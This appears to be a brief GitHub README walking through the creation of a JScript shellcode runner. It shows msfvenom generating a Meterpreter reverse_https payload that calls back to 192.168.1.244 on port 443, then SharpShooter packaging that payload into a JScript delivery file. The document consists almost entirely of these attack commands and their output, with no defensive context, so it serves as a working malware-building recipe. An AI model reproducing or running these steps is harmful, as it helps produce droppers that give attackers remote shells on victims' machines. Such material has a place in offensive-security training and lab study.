creating a shellcode runner with Jscript by leveraging DotNetToJscript
generate Meterpreter reverse stager and write the raw output format to a file.

Than execute sharpshooter 



```
┌──(kali㉿kali)-[~/SharpShooter]
└─$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.244 LPORT=443 -f raw -o shell.tx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 649 bytes
Saved as: shell.tx
                                                                                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/SharpShooter]
└─$ sudo python2 SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile shell.tx --output test 

       _____ __                    _____ __                __           
      / ___// /_  ____ __________ / ___// /_  ____  ____  / /____  _____
      \__ \/ __ \/ __ `/ ___/ __ \__ \/ __ \/ __ \/ __ \/ __/ _ \/ ___/
     ___/ / / / / /_/ / /  / /_/ /__/ / / / / /_/ / /_/ / /_/  __/ /    
    /____/_/ /_/\__,_/_/  / .___/____/_/ /_/\____/\____/\__/\___/_/     
                         /_/                                            

     Dominic Chell, @domchell, MDSec ActiveBreach, v2.0
    
[*] Written delivery payload to output/test.js
```
![image](https://github.com/VietTheBarbarian/sharpshooter-fun/assets/56415307/d272f242-8442-47f9-841b-a9222129c359)

